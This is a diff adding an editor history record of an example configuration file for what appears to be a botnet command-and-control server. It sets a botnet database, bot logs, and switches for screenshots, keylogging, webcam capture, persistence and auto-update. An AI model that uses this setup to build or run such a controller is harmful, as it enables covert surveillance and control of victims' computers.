@@ -1,0 +1,18 @@
+{
+    "sourceFile": "config/config.ini.example",
+    "activeCommit": 0,
+    "commits": [
+        {
+            "activePatchIndex": 0,
+            "patches": [
+                {
+                    "date": 1740311231529,
+                    "content": "Index: \n===================================================================\n--- \n+++ \n"
+                }
+            ],
+            "date": 1740311231529,
+            "name": "Commit-0",
+            "content": "[NETWORK]\r\n# Configuración del servidor C&C\r\nHOST = 127.0.0.1\r\nPORT = 5001\r\nAPI_PORT = 5000\r\nMAX_CONNECTIONS = 100\r\nTIMEOUT = 30\r\n\r\n[DATABASE]\r\n# Configuración de la base de datos\r\nDB_PATH = db/botnet.db\r\nDB_BACKUP_PATH = db/backup/\r\n\r\n[LOGGING]\r\n# Configuración de logs\r\nLOG_DIR = logs\r\nSERVER_LOG_FILE = server.log\r\nBOT_LOG_FILE = bots.log\r\nERROR_LOG_FILE = error.log\r\nLOG_LEVEL = INFO\r\nLOG_FORMAT = %%(asctime)s - %%(levelname)s - %%(message)s\r\n\r\n[SECURITY]\r\n# Configuración de seguridad\r\nENABLE_SSL = false\r\nSSL_CERT = certs/server.crt\r\nSSL_KEY = certs/server.key\r\nAUTHENTICATION_REQUIRED = true\r\nAPI_KEY = your_api_key_here\r\nMAX_FAILED_ATTEMPTS = 3\r\nLOCKOUT_TIME = 300\r\n\r\n[FEATURES]\r\n# Características del servidor\r\nENABLE_FILE_OPERATIONS = true\r\nENABLE_SCREENSHOTS = true\r\nENABLE_KEYLOGGER = false\r\nENABLE_WEBCAM = false\r\nPERSISTENCE = true\r\nAUTO_UPDATE = true\r\n\r\n[NOTIFICATIONS]\r\n# Configuración de notificaciones\r\nENABLE_DISCORD = true\r\nENABLE_EMAIL = false\r\nEMAIL_SMTP_SERVER = smtp.example.com\r\nEMAIL_PORT = 587\r\nEMAIL_USER = user@example.com\r\nEMAIL_PASSWORD = your_password_here\r\nNOTIFICATION_LEVEL = WARNING\r\n"
+        }
+    ]
+}
